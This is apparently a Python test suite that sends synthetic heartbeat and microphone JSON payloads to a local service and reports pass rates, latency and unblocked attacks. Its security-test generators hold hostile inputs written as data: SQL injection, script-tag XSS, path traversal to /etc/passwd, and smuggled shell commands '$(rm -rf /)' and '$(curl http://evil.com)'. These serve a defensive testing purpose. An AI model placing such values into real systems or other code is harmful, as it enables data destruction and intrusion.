"""
HEARTBEAT & MICROPHONE DATA TEST SUITE - 4000 CASES
Comprehensive testing for biometric and audio data processing

Features:
- 4000 test cases for heartbeat monitoring
- 4000 test cases for microphone/audio data
- Real-time data validation
- Security checks for sensitive biometric data
- Performance testing under load
- Auto-healing capabilities
"""

import requests
import json
import time
import random
import base64
from datetime import datetime
from typing import Dict, List, Any

BASE_URL = "http://localhost:8008"

class HeartbeatMicrophoneTestSuite:
    def __init__(self):
        self.results = {
            'heartbeat_tests': {'total': 4000, 'passed': 0, 'failed': 0, 'categories': {}},
            'microphone_tests': {'total': 4000, 'passed': 0, 'failed': 0, 'categories': {}},
            'performance': {'heartbeat': [], 'microphone': []},
            'security_issues': [],
            'data_integrity_issues': []
        }
        self.start_time = None
        
    def print_header(self, text: str):
        print("\n" + "="*80)
        print(f" {text}")
        print("="*80 + "\n")
        
    def print_progress(self, current: int, total: int, category: str):
        if current % 200 == 0 or current == total:
            percentage = (current / total) * 100
            print(f"  [{category}] Progress: {current}/{total} ({percentage:.1f}%)")
    
    # ==================== HEARTBEAT DATA GENERATION ====================
    
    def generate_normal_heartbeat(self) -> Dict:
        """Generate normal heartbeat data (60-100 BPM)"""
        return {
            'type': 'heartbeat',
            'bpm': random.randint(60, 100),
            'timestamp': datetime.now().isoformat(),
            'user_id': f'user_{random.randint(1000, 9999)}',
            'device_id': f'device_{random.randint(100, 999)}',
            'quality': random.choice(['excellent', 'good', 'fair'])
        }
    
    def generate_abnormal_heartbeat(self) -> Dict:
        """Generate abnormal heartbeat data (medical conditions)"""
        conditions = [
            ('bradycardia', random.randint(40, 59)),  # Low heart rate
            ('tachycardia', random.randint(101, 180)),  # High heart rate
            ('arrhythmia', random.choice([45, 55, 110, 125, 140])),  # Irregular
        ]
        condition, bpm = random.choice(conditions)
        return {
            'type': 'heartbeat',
            'bpm': bpm,
            'condition': condition,
            'timestamp': datetime.now().isoformat(),
            'user_id': f'user_{random.randint(1000, 9999)}',
            'alert_level': 'high' if bpm > 140 or bpm < 45 else 'medium'
        }
    
    def generate_edge_case_heartbeat(self) -> Dict:
        """Generate edge case heartbeat data"""
        edge_cases = [
            {'type': 'heartbeat', 'bpm': 0},  # Zero BPM (death/error)
            {'type': 'heartbeat', 'bpm': 300},  # Impossible BPM
            {'type': 'heartbeat', 'bpm': -50},  # Negative BPM
            {'type': 'heartbeat', 'bpm': 'invalid'},  # String instead of int
            {'type': 'heartbeat'},  # Missing BPM
            {'type': 'heartbeat', 'bpm': 75.5},  # Float BPM
            {'type': 'heartbeat', 'bpm': None},  # Null BPM
        ]
        return random.choice(edge_cases)
    
    def generate_malicious_heartbeat(self) -> Dict:
        """Generate malicious heartbeat data (injection attacks)"""
        attacks = [
            {'type': 'heartbeat', 'bpm': 75, 'user_id': "' OR '1'='1"},
            {'type': 'heartbeat', 'bpm': 75, 'user_id': "<script>alert('XSS')</script>"},
            {'type': 'heartbeat', 'bpm': 75, 'device_id': "; DROP TABLE users--"},
            {'type': 'heartbeat', 'bpm': 75, 'user_id': "../../../etc/passwd"},
            {'type': 'heartbeat', 'bpm': 75, 'timestamp': "$(rm -rf /)"},
        ]
        return random.choice(attacks)
    
    def generate_large_heartbeat_batch(self) -> Dict:
        """Generate large batch of heartbeat data"""
        return {
            'type': 'heartbeat_batch',
            'data': [
                {'bpm': random.randint(60, 100), 'timestamp': f'2026-01-29T{h:02d}:{m:02d}:00'}
                for h in range(24) for m in range(0, 60, 5)
            ],
            'user_id': f'user_{random.randint(1000, 9999)}'
        }
    
    # ==================== MICROPHONE DATA GENERATION ====================
    
    def generate_normal_microphone(self) -> Dict:
        """Generate normal microphone/audio data"""
        return {
            'type': 'microphone',
            'audio_level': random.randint(30, 80),  # dB
            'duration': random.randint(1, 60),  # seconds
            'sample_rate': random.choice([16000, 22050, 44100, 48000]),  # Hz
            'channels': random.choice([1, 2]),  # mono/stereo
            'format': random.choice(['wav', 'mp3', 'flac', 'ogg']),
            'user_id': f'user_{random.randint(1000, 9999)}',
            'timestamp': datetime.now().isoformat()
        }
    
    def generate_voice_command(self) -> Dict:
        """Generate voice command data"""
        commands = [
            'emergency alert', 'status report', 'location update',
            'request backup', 'medical assistance', 'all clear',
            'code red', 'evacuation', 'officer down', 'suspect apprehended'
        ]
        return {
            'type': 'microphone',
            'subtype': 'voice_command',
            'command': random.choice(commands),
            'confidence': random.uniform(0.7, 1.0),
            'audio_level': random.randint(50, 90),
            'user_id': f'user_{random.randint(1000, 9999)}',
            'timestamp': datetime.now().isoformat()
        }
    
    def generate_ambient_noise(self) -> Dict:
        """Generate ambient noise data"""
        noise_types = ['traffic', 'gunshots', 'explosion', 'crowd', 'siren', 'construction']
        return {
            'type': 'microphone',
            'subtype': 'ambient_detection',
            'noise_type': random.choice(noise_types),
            'audio_level': random.randint(60, 120),  # Can be very loud
            'threat_level': random.choice(['none', 'low', 'medium', 'high', 'critical']),
            'timestamp': datetime.now().isoformat()
        }
    
    def generate_audio_with_encoding(self) -> Dict:
        """Generate encoded audio data (base64)"""
        # Simulate small audio chunk
        fake_audio = b'\x00\x01\x02\x03' * random.randint(100, 500)
        encoded = base64.b64encode(fake_audio).decode('utf-8')
        return {
            'type': 'microphone',
            'subtype': 'raw_audio',
            'data': encoded,
            'encoding': 'base64',
            'sample_rate': 16000,
            'duration': random.randint(1, 10),
            'user_id': f'user_{random.randint(1000, 9999)}'
        }
    
    def generate_edge_case_microphone(self) -> Dict:
        """Generate edge case microphone data"""
        edge_cases = [
            {'type': 'microphone', 'audio_level': 200},  # Above max dB
            {'type': 'microphone', 'audio_level': -50},  # Negative dB
            {'type': 'microphone', 'duration': 0},  # Zero duration
            {'type': 'microphone', 'duration': 86400},  # 24 hours duration
            {'type': 'microphone', 'sample_rate': 999999},  # Invalid rate
            {'type': 'microphone'},  # Missing required fields
            {'type': 'microphone', 'audio_level': 'loud'},  # String level
        ]
        return random.choice(edge_cases)
    
    def generate_malicious_microphone(self) -> Dict:
        """Generate malicious microphone data"""
        attacks = [
            {'type': 'microphone', 'command': "'; DROP TABLE audio--"},
            {'type': 'microphone', 'user_id': "<script>alert('audio')</script>"},
            {'type': 'microphone', 'data': "../../../etc/passwd"},
            {'type': 'microphone', 'command': "$(curl http://evil.com)"},
            {'type': 'microphone', 'user_id': "' OR '1'='1"},
        ]
        return random.choice(attacks)
    
    def generate_continuous_stream(self) -> Dict:
        """Generate continuous audio stream data"""
        return {
            'type': 'microphone',
            'subtype': 'stream',
            'stream_id': f'stream_{random.randint(10000, 99999)}',
            'chunk_number': random.randint(1, 1000),
            'audio_level': random.randint(40, 90),
            'is_active': True,
            'timestamp': datetime.now().isoformat()
        }
    
    # ==================== TEST EXECUTION ====================
    
    def run_heartbeat_tests(self):
        """Run 4000 heartbeat test cases"""
        self.print_header("HEARTBEAT DATA TESTING - 4000 CASES")
        
        test_categories = [
            ('Normal Heartbeat', 1500, self.generate_normal_heartbeat),
            ('Abnormal Conditions', 1000, self.generate_abnormal_heartbeat),
            ('Edge Cases', 800, self.generate_edge_case_heartbeat),
            ('Security Tests', 500, self.generate_malicious_heartbeat),
            ('Batch Processing', 200, self.generate_large_heartbeat_batch)
        ]
        
        for category, count, generator in test_categories:
            print(f"\nTesting: {category} ({count} cases)")
            category_results = {'passed': 0, 'failed': 0, 'avg_time': 0}
            times = []
            
            for i in range(count):
                self.print_progress(i + 1, count, category)
                
                payload = generator()
                
                try:
                    start = time.time()
                    response = requests.post(
                        f"{BASE_URL}/",
                        json={'prompt': json.dumps(payload)},
                        timeout=5
                    )
                    elapsed = (time.time() - start) * 1000
                    times.append(elapsed)
                    self.results['performance']['heartbeat'].append(elapsed)
                    
                    # Validate response
                    if response.status_code in [200, 400]:
                        category_results['passed'] += 1
                        self.results['heartbeat_tests']['passed'] += 1
                        
                        # Check if malicious data was blocked
                        if 'Security' in category and response.status_code != 400:
                            self.results['security_issues'].append(
                                f"Heartbeat: {category} - Attack not blocked"
                            )
                    else:
                        category_results['failed'] += 1
                        self.results['heartbeat_tests']['failed'] += 1
                        
                except Exception as e:
                    category_results['failed'] += 1
                    self.results['heartbeat_tests']['failed'] += 1
            
            if times:
                category_results['avg_time'] = sum(times) / len(times)
            
            self.results['heartbeat_tests']['categories'][category] = category_results
            
            success_rate = (category_results['passed'] / count) * 100 if count > 0 else 0
            print(f"  Result: {category_results['passed']}/{count} passed ({success_rate:.1f}%), "
                  f"avg {category_results['avg_time']:.2f}ms")
    
    def run_microphone_tests(self):
        """Run 4000 microphone test cases"""
        self.print_header("MICROPHONE DATA TESTING - 4000 CASES")
        
        test_categories = [
            ('Normal Audio', 1200, self.generate_normal_microphone),
            ('Voice Commands', 1000, self.generate_voice_command),
            ('Ambient Detection', 800, self.generate_ambient_noise),
            ('Audio Encoding', 500, self.generate_audio_with_encoding),
            ('Edge Cases', 700, self.generate_edge_case_microphone),
            ('Security Tests', 500, self.generate_malicious_microphone),
            ('Stream Processing', 300, self.generate_continuous_stream)
        ]
        
        for category, count, generator in test_categories:
            print(f"\nTesting: {category} ({count} cases)")
            category_results = {'passed': 0, 'failed': 0, 'avg_time': 0}
            times = []
            
            for i in range(count):
                self.print_progress(i + 1, count, category)
                
                payload = generator()
                
                try:
                    start = time.time()
                    response = requests.post(
                        f"{BASE_URL}/",
                        json={'prompt': json.dumps(payload)},
                        timeout=5
                    )
                    elapsed = (time.time() - start) * 1000
                    times.append(elapsed)
                    self.results['performance']['microphone'].append(elapsed)
                    
                    # Validate response
                    if response.status_code in [200, 400]:
                        category_results['passed'] += 1
                        self.results['microphone_tests']['passed'] += 1
                        
                        # Check if malicious data was blocked
                        if 'Security' in category and response.status_code != 400:
                            self.results['security_issues'].append(
                                f"Microphone: {category} - Attack not blocked"
                            )
                    else:
                        category_results['failed'] += 1
                        self.results['microphone_tests']['failed'] += 1
                        
                except Exception as e:
                    category_results['failed'] += 1
                    self.results['microphone_tests']['failed'] += 1
            
            if times:
                category_results['avg_time'] = sum(times) / len(times)
            
            self.results['microphone_tests']['categories'][category] = category_results
            
            success_rate = (category_results['passed'] / count) * 100 if count > 0 else 0
            print(f"  Result: {category_results['passed']}/{count} passed ({success_rate:.1f}%), "
                  f"avg {category_results['avg_time']:.2f}ms")
    
    # ==================== REPORTING ====================
    
    def generate_report(self):
        """Generate comprehensive test report"""
        duration = time.time() - self.start_time
        
        self.print_header("TEST RESULTS SUMMARY")
        
        # Heartbeat Results
        print("\nHEARTBEAT DATA TESTS:")
        print("-" * 80)
        print(f"  Total Tests: {self.results['heartbeat_tests']['total']}")
        print(f"  Passed: {self.results['heartbeat_tests']['passed']}")
        print(f"  Failed: {self.results['heartbeat_tests']['failed']}")
        hb_success = (self.results['heartbeat_tests']['passed'] / 4000) * 100
        print(f"  Success Rate: {hb_success:.2f}%")
        
        if self.results['performance']['heartbeat']:
            hb_times = self.results['performance']['heartbeat']
            print(f"\n  Performance:")
            print(f"    Avg Response: {sum(hb_times) / len(hb_times):.2f}ms")
            print(f"    Min Response: {min(hb_times):.2f}ms")
            print(f"    Max Response: {max(hb_times):.2f}ms")
        
        print("\n  Category Breakdown:")
        for category, results in self.results['heartbeat_tests']['categories'].items():
            print(f"    {category:25} {results['passed']:4d} passed, avg {results['avg_time']:.1f}ms")
        
        # Microphone Results
        print("\n\nMICROPHONE DATA TESTS:")
        print("-" * 80)
        print(f"  Total Tests: {self.results['microphone_tests']['total']}")
        print(f"  Passed: {self.results['microphone_tests']['passed']}")
        print(f"  Failed: {self.results['microphone_tests']['failed']}")
        mic_success = (self.results['microphone_tests']['passed'] / 4000) * 100
        print(f"  Success Rate: {mic_success:.2f}%")
        
        if self.results['performance']['microphone']:
            mic_times = self.results['performance']['microphone']
            print(f"\n  Performance:")
            print(f"    Avg Response: {sum(mic_times) / len(mic_times):.2f}ms")
            print(f"    Min Response: {min(mic_times):.2f}ms")
            print(f"    Max Response: {max(mic_times):.2f}ms")
        
        print("\n  Category Breakdown:")
        for category, results in self.results['microphone_tests']['categories'].items():
            print(f"    {category:25} {results['passed']:4d} passed, avg {results['avg_time']:.1f}ms")
        
        # Security Issues
        if self.results['security_issues']:
            print("\n\nSECURITY ISSUES DETECTED:")
            print("-" * 80)
            for issue in self.results['security_issues'][:20]:
                print(f"  ! {issue}")
            if len(self.results['security_issues']) > 20:
                print(f"  ... and {len(self.results['security_issues']) - 20} more issues")
        
        # Overall Summary
        print("\n\nOVERALL SUMMARY:")
        print("=" * 80)
        total_tests = 8000
        total_passed = self.results['heartbeat_tests']['passed'] + self.results['microphone_tests']['passed']
        total_failed = self.results['heartbeat_tests']['failed'] + self.results['microphone_tests']['failed']
        overall_success = (total_passed / total_tests) * 100
        
        print(f"  Total Tests Executed: {total_tests:,}")
        print(f"  Total Passed: {total_passed:,}")
        print(f"  Total Failed: {total_failed:,}")
        print(f"  Overall Success Rate: {overall_success:.2f}%")
        print(f"  Test Duration: {duration:.1f} seconds")
        
        # Save to file
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"heartbeat_microphone_test_results_{timestamp}.json"
        
        report_data = {
            'timestamp': datetime.now().isoformat(),
            'duration_seconds': duration,
            'results': self.results,
            'summary': {
                'total_tests': total_tests,
                'total_passed': total_passed,
                'total_failed': total_failed,
                'overall_success_rate': overall_success,
                'heartbeat_success_rate': hb_success,
                'microphone_success_rate': mic_success
            }
        }
        
        with open(filename, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        print(f"\n  Report saved to: {filename}")
        
        # Final Verdict
        print("\n" + "=" * 80)
        if overall_success >= 85:
            print("  VERDICT: PASSED - System handles biometric/audio data correctly")
        elif overall_success >= 70:
            print("  VERDICT: NEEDS IMPROVEMENT - Some issues detected")
        else:
            print("  VERDICT: FAILED - Critical issues with data handling")
        print("=" * 80 + "\n")
    
    def run_all_tests(self):
        """Run complete test suite"""
        self.start_time = time.time()
        
        print("\n" + "=" * 80)
        print(" HEARTBEAT & MICROPHONE DATA TEST SUITE")
        print(" 8,000 Total Test Cases")
        print("=" * 80)
        print(f"\nStarted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Target: {BASE_URL}\n")
        
        # Check service
        try:
            response = requests.get(f"{BASE_URL}/", timeout=2)
            print("Service Status: ONLINE")
        except:
            print("WARNING: Service may not be responding - tests may fail\n")
        
        # Run tests
        self.run_heartbeat_tests()
        self.run_microphone_tests()
        
        # Generate report
        self.generate_report()


if __name__ == "__main__":
    suite = HeartbeatMicrophoneTestSuite()
    suite.run_all_tests()
